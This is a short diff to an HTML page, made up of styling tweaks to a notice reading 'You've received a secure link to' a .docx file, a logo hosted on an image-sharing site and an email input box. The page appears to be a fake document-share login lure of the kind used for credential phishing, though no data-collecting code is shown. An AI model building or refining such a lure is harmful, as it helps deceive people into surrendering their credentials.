@@ -24,7 +24,7 @@
 
         <div class="content">
           <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="90" height="30" />
-          <p style="font-size: 17px; font-weight: bold; color: #333333;">You've received a secure link to:</p>
+          <p style="font-size: 17px; color: #333333;">You've received a secure link to:</p>
           <p style="font-size: 14px; font-weight: bold; color: #333333;">FA65478-06-17-2025.docx</p>
          
 
@@ -206,7 +206,7 @@ body {
   max-width: 330px;
   background: #fff;
   border-radius: 5px;
-  box-shadow: 0 2px 16px rgba(0, 0, 0, 0.1);
+  box-shadow: 0 1px 10px rgba(0, 0, 0, 0.1);
   padding: 2rem;
   display: flex;
   flex-direction: column;
@@ -249,7 +249,7 @@ body {
 .email-input {
   width: 88%;
   padding: 0.6rem;
-  border: 1px solid #e1e1e1;
+  border: 0.6px solid #e1e1e1;
   border-radius: 5px;
   font-size: 1rem;
   background-color: #fff;
